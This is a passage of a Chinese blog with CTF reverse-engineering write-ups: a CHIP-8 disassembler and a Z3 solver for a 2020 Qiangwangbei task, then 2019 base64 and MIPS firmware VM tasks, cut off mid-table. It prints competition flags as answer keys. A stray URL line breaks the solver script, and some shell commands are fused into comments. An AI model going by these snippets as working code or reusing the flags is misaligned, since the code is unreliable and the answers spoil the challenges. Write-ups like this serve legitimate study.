<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;game.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">   s = f.read()</span><br><span class="line">   s=b2a_hex(s).decode()</span><br><span class="line"><span class="comment">#    print(s)</span></span><br><span class="line"><span class="comment">#    input()</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">4</span>):</span><br><span class="line">   t = s[i:i + <span class="number">4</span>]</span><br><span class="line"><span class="comment">#    print(t)</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;addr:&quot;</span> + <span class="built_in">hex</span>(j + <span class="number">0x200</span>), end=<span class="string">&quot;   &quot;</span>)</span><br><span class="line">   j += <span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span> t[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> t[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> t[<span class="number">2</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> t[<span class="number">3</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;clear screen&quot;</span>)</span><br><span class="line">          <span class="keyword">elif</span> t[<span class="number">3</span>] == <span class="string">&#x27;f&#x27;</span>:   </span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;Returns from a subroutine&quot;</span>)</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;call program at addr: &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;call program at addr: &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;jmp &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;call &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; equals &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; not equals &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; equals V&quot;</span> + t[<span class="number">2</span>])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; = &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; += &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">       VX = <span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>]</span><br><span class="line">       VY = <span class="string">&quot;V&quot;</span> + t[<span class="number">2</span>]</span><br><span class="line">       <span class="keyword">if</span> t[-<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VX + <span class="string">&quot; | &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VX + <span class="string">&quot; &amp; &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VX + <span class="string">&quot; ^ &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; += &quot;</span> + VY, <span class="string">&quot; set VF=1 if VX&gt;=255&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; -= &quot;</span> + VY, <span class="string">&quot; set VF=0 if VX&lt;=0&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; &gt;&gt;= 1&quot;</span>, <span class="string">&quot; the last one to VF&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VY + <span class="string">&quot; - &quot;</span> + VX, <span class="string">&quot; set VF=0 if VX&amp;lt;0&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; &lt;&lt;= 1&quot;</span>, <span class="string">&quot; the first one to VF&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;Invalid instruction: &quot;</span> + t)</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; not equals V&quot;</span> + t[<span class="number">2</span>])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;set I = &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;jmp V0+&quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot;=rand()&amp;&quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;display at (V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot;,&quot;</span> + <span class="string">&quot;V&quot;</span> + t[<span class="number">2</span>] + <span class="string">&quot;) for &quot;</span> + t[<span class="number">3</span>] + <span class="string">&quot;rows&quot;</span>)</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;something about buttons&quot;</span>)</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> t[<span class="number">2</span>:] == <span class="string">&#x27;29&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;set I=&quot;</span> + <span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>])</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;0a&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;set V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; = button pressed&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;55&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;store V0-V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; to addr start at I&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;65&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;store addr start at I to V0-V&quot;</span> + t[<span class="number">1</span>])</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;33&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;set BCD(V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Invalid instruction: &quot;</span> + t)</span><br></pre></td></tr></table></figure>

<p>运行后得到汇编（根据chip8内存的排布规律，可执行代码从200开始）：</p>
<p>可以看到程序入口直接跳转到2ce</p>
<p><img src="/1763434247558-13.png" alt="img"></p>
<p><img src="/1763434247558-14.png" alt="img"></p>
<p>这里有两个主要函数928和938，928是用来读取按键输入的，938是用来把输入显示在屏幕上的</p>
<p>发现这两个函数被调用十次之后就开始运算操作了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">addr:0x438   Va = V0</span><br><span class="line">addr:0x43a   Vb = V0</span><br><span class="line">addr:0x43c   Vc = 02</span><br><span class="line">addr:0x43e   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x440   Va = Vb</span><br><span class="line">addr:0x442   V0 = Va</span><br><span class="line">addr:0x444   Va = V1</span><br><span class="line">addr:0x446   Vb = V1</span><br><span class="line">addr:0x448   Vc = 01</span><br><span class="line">addr:0x44a   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x44c   Va = Vb</span><br><span class="line">addr:0x44e   V1 = Va</span><br><span class="line">addr:0x450   Va = V2</span><br><span class="line">addr:0x452   Vb = V2</span><br><span class="line">addr:0x454   Vc = 01</span><br><span class="line">addr:0x456   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x458   Vc = 01</span><br><span class="line">addr:0x45a   Vb = Vb ^ Vc</span><br><span class="line">addr:0x45c   Va = Vb</span><br><span class="line">addr:0x45e   V2 = Va</span><br><span class="line">addr:0x460   Va = V3</span><br><span class="line">addr:0x462   Vb = V3</span><br><span class="line">addr:0x464   Vc = 03</span><br><span class="line">addr:0x466   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x468   Va = Vb</span><br><span class="line">addr:0x46a   V3 = Va</span><br><span class="line">addr:0x46c   Va = V4</span><br><span class="line">addr:0x46e   Vb = V4</span><br><span class="line">addr:0x470   Vc = 02</span><br><span class="line">addr:0x472   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x474   Va = Vb</span><br><span class="line">addr:0x476   V4 = Va</span><br><span class="line">addr:0x478   Va = V5</span><br><span class="line">addr:0x47a   Vb = V5</span><br><span class="line">addr:0x47c   Vc = 02</span><br><span class="line">addr:0x47e   Vb = Vb ^ Vc</span><br><span class="line">addr:0x480   Vc = 01</span><br><span class="line">addr:0x482   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x484   Va = Vb</span><br><span class="line">addr:0x486   V5 = Va</span><br><span class="line">addr:0x488   Va = V6</span><br><span class="line">addr:0x48a   Vb = V6</span><br><span class="line">addr:0x48c   Vc = V6</span><br><span class="line">addr:0x48e   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x490   Va = Vb</span><br><span class="line">addr:0x492   V6 = Va</span><br><span class="line">addr:0x494   Va = V7</span><br><span class="line">addr:0x496   Vb = V7</span><br><span class="line">addr:0x498   Vc = 01</span><br><span class="line">addr:0x49a   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x49c   Va = Vb</span><br><span class="line">addr:0x49e   V7 = Va</span><br><span class="line">addr:0x4a0   Va = V8</span><br><span class="line">addr:0x4a2   Vb = V8</span><br><span class="line">addr:0x4a4   Vc = 01</span><br><span class="line">addr:0x4a6   Vb = Vb ^ Vc</span><br><span class="line">addr:0x4a8   Vc = 01</span><br><span class="line">addr:0x4aa   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x4ac   Va = Vb</span><br><span class="line">addr:0x4ae   V8 = Va</span><br><span class="line">addr:0x4b0   Va = V9</span><br><span class="line">addr:0x4b2   Vb = V9</span><br><span class="line">addr:0x4b4   Vc = 02</span><br><span class="line">addr:0x4b6   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x4b8   Va = Vb</span><br><span class="line">addr:0x4ba   V9 = Va</span><br></pre></td></tr></table></figure>

<p>上面这些简单对输入值进行了处理，按键值（U0到U9），修改后值（V0到V9）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">V0 = U0 + 2</span><br><span class="line">V1 = U1 + 1</span><br><span class="line">V2 = (U2 + 1) ^ 1</span><br><span class="line">V3 = U3 + 3 </span><br><span class="line">V4 = U4 + 4</span><br><span class="line">V5 = U5 ^ 2 + 1</span><br><span class="line">V6 = U6 * 2</span><br><span class="line">V7 = U7 + 1</span><br><span class="line">V8 = U8 ^ 1 + 1</span><br><span class="line">V9 = U9 + 2</span><br></pre></td></tr></table></figure>

<p>然后接下来就是方程运算：</p>
<p><img src="/1763434247558-15.png" alt="img"></p>
<p>这里有个经常使用的函数27a：</p>
<p><img src="/1763434247558-16.png" alt="img"></p>
<p>递归相加V1次，也就是V0*V1乘法操作</p>
<p>所以方程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">V0 + 2*V1 + V2 = 0x21</span><br><span class="line">2*V0 + V1 + V2 = 42</span><br><span class="line">V0 + 2*V1 + 2*V2 = 48</span><br><span class="line">V3 + 2*V4 + V5 = 55</span><br><span class="line">2*V3 + V4 + V5 = 55</span><br><span class="line">V3 + 2*V4 + 2*V5 = 59</span><br><span class="line">V6 + 2*V7 + V8 = 31</span><br><span class="line">2*V6 + V7 + V8 = 22</span><br><span class="line">V6 + 2*V7 + 2*V8 = 32</span><br><span class="line">V9 = 5</span><br></pre></td></tr></table></figure>

<p>得到所有方程，使用Z3求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = [Int(<span class="string">&#x27;v%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">flag = []</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> f:</span><br><span class="line">    solver.add(c &gt;= <span class="number">0x0</span>)</span><br><span class="line">    solver.add(c &lt;= <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">solver.add(f[<span class="number">0</span>] + <span class="number">2</span> * f[<span class="number">1</span>] + f[<span class="number">2</span>] == <span class="number">0x21</span>)</span><br><span class="line">solver.add(<span class="number">2</span> * f[<span class="number">0</span>] + f[<span class="number">1</span>] + f[<span class="number">2</span>] == <span class="number">42</span>)</span><br><span class="line">solver.add(f[<span class="number">0</span>] + <span class="number">2</span> * f[<span class="number">1</span>] + <span class="number">2</span> * f[<span class="number">2</span>] == <span class="number">48</span>)</span><br><span class="line">solver.add(f[<span class="number">3</span>] + <span class="number">2</span> * f[<span class="number">4</span>] + f[<span class="number">5</span>] == <span class="number">55</span>)</span><br><span class="line">solver.add(<span class="number">2</span> * f[<span class="number">3</span>] + f[<span class="number">4</span>] + f[<span class="number">5</span>] == <span class="number">55</span>)</span><br><span class="line">solver.add(f[<span class="number">3</span>] + <span class="number">2</span> * f[<span class="number">4</span>] + <span class="number">2</span> * f[<span class="number">5</span>] == <span class="number">59</span>)</span><br><span class="line">solver.add(f[<span class="number">6</span>] + <span class="number">2</span> * f[<span class="number">7</span>] + f[<span class="number">8</span>] == <span class="number">31</span>)</span><br><span class="line">solver.add(<span class="number">2</span> * f[<span class="number">6</span>] + f[<span class="number">7</span>] + f[<span class="number">8</span>] == <span class="number">22</span>)</span><br><span class="line">solver.add(f[<span class="number">6</span>] + <span class="number">2</span> * f[<span class="number">7</span>] + <span class="number">2</span> * f[<span class="number">8</span>] == <span class="number">32</span>)</span><br><span class="line">https://ctf.junior.nu1l.com/</span><br><span class="line"><span class="comment"># if solver.check() == sat:</span></span><br><span class="line"><span class="comment">#     model = solver.model()</span></span><br><span class="line"><span class="comment">#     solver.add(RecurOr(f, model))</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    ff = [model[f[<span class="number">0</span>]].as_long() - <span class="number">2</span>, model[f[<span class="number">1</span>]].as_long() - <span class="number">1</span>, (model[f[<span class="number">2</span>]].as_long() ^ <span class="number">1</span>) - <span class="number">1</span>,</span><br><span class="line">          model[f[<span class="number">3</span>]].as_long() - <span class="number">3</span>, model[f[<span class="number">4</span>]].as_long() - <span class="number">2</span>, (model[f[<span class="number">5</span>]].as_long() - <span class="number">1</span>) ^ <span class="number">2</span>,</span><br><span class="line">          model[f[<span class="number">6</span>]].as_long() // <span class="number">2</span>, model[f[<span class="number">7</span>]].as_long() - <span class="number">1</span>, (model[f[<span class="number">8</span>]].as_long() - <span class="number">1</span>) ^ <span class="number">1</span>, <span class="number">5</span> - <span class="number">2</span>]</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;6c8f1d78770fe672122478c6f9a150e1&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ff)):</span><br><span class="line">        flag += <span class="built_in">str</span>(<span class="built_in">hex</span>(ff[i]).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># a2def12c13</span></span><br></pre></td></tr></table></figure>

<p>最后得到flag：flag{6c8f1d78770fe672122478c6f9a150e1a2def12c13}</p>
<p>参考题解：<a target="_blank" rel="noopener" href="https://rycbar77.github.io/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/">https://rycbar77.github.io/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</a>  （这个里面提供除AES外的两个脚本都有误，这里修改之后是正确的）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/12/15/qwb2020-re/" data-id="cuiddWyLK-C7N3FCI6GBmIwQd" data-title="qwb2020-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2019-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/11/22/qwb2019-re/" class="article-date">
  <time class="dt-published" datetime="2023-11-22T02:46:12.000Z" itemprop="datePublished">2023-11-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/11/22/qwb2019-re/">qwb2019-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2019-re-强网先锋"><a href="#2019-re-强网先锋" class="headerlink" title="2019 re 强网先锋"></a>2019 re 强网先锋</h1><p>一个简单的base64，签到题</p>
<p><img src="/1763433999333-27.png" alt="img"></p>
<p>解码即可：flag{mafakuailaiqiandaob}</p>
<h1 id="2019-re-设备固件"><a href="#2019-re-设备固件" class="headerlink" title="2019 re 设备固件"></a>2019 re 设备固件</h1><p>题目给了一个完整的文件系统镜像和一个elf文件，根据readme中所述使用以下命令模拟运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot; </span><br></pre></td></tr></table></figure>

<p>而后在&#x2F;bin中找到目标二进制文件hello：</p>
<p><img src="/1763433999325-1.png" alt="img"></p>
<p>运行：</p>
<p><img src="/1763433999325-2.png" alt="img"></p>
<p>但是这个二进制文件在系统里面，没办法拿出来用ida查看，先想想办法把hello文件提取出来</p>
<p>采用在宿主机上挂载 ext4 镜像的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 1. 创建一个目录作为挂载点sudo mkdir /mnt/openwrt-root</span><br><span class="line"></span><br><span class="line"># 2. 使用 loop 设备挂载 ext4 镜像文件sudo mount -o loop openwrt-malta-le-root.ext4 /mnt/openwrt-root</span><br></pre></td></tr></table></figure>

<p>而后镜像文件的所有内容都暴露在 <code>/mnt/openwrt-root</code> 目录下</p>
<p><img src="/1763433999325-3.png" alt="img"></p>
<p>找到hello文件完成提取</p>
<p><img src="/1763433999325-4.png" alt="img"></p>
<p>首先使用file命令分析：</p>
<p><img src="/1763433999325-5.png" alt="img"></p>
<p>32位mips架构</p>
<p>放入ida内分析：</p>
<p><img src="/1763433999325-6.png" alt="img"></p>
<p>可以看到首先将输入的用户名放入v7的前40个字节中，密码放入后40个字节中，而后进入函数sub_400D48进行判断，该函数主要有两个部分，分别是函数sub_400C6C有用于验证用户名是否正确，函数sub_400CC4用于验证密码是否正确</p>
<p><img src="/1763433999325-7.png" alt="img"></p>
<p>先看函数sub_400C6C</p>
<p><img src="/1763433999325-8.png" alt="img"></p>
<p>很容易看出来该用户名就是直接确定了<code>dd772</code></p>
<p>只有<code>dd772</code>才能令最终v1&#x3D;&#x3D;0</p>
<p>而后看函数sub_400CC4：</p>
<p><img src="/1763433999325-9.png" alt="img"></p>
<p>主要逻辑在sub_400800，该函数主要是模拟虚拟机执行，有以下操作：</p>
<table>
<thead>
<tr>
<th>操作码</th>
<th>符号</th>
<th>num1</th>
<th>num2</th>
<th>行为</th>
</tr>
</thead>
<tbody><tr>
<td>0x01</td>
<td>add</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1+&#x3D;num2</td>
</tr>
<tr>
<td>0x02</td>
<td>sub</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1-&#x3D;num2</td>
</tr>
<tr>
<td>0x03</td>
<td>cmp</td>
<td>寄存器</td>
<td>寄存器</td>
<td>ZF&#x3D;(num1&#x3D;&#x3D;num2?1:2)</td>
</tr>
<tr>
<td>0x04</td>
<td>jmp</td>
<td>立即数</td>
<td>-</td>
<td>IP+&#x3D;num1</td>
</tr>
<tr>
<td>0x05</td>
<td>mov</td>
<td>寄存器</td>
<td>寄存器</td>
<td>num1&#x3D;num2</td>
</tr>
<tr>
<td>0x06</td>
<td>-</td>
<td>寄存器</td>
<td>-</td>
<td>num1&#x3D;IP</td>
</tr>
<tr>
<td>0x07</td>
<td>-</td>
<td>寄存器</td>
<td>-</td>
<td>IP&#x3D;num1</td>
</tr>
<tr>
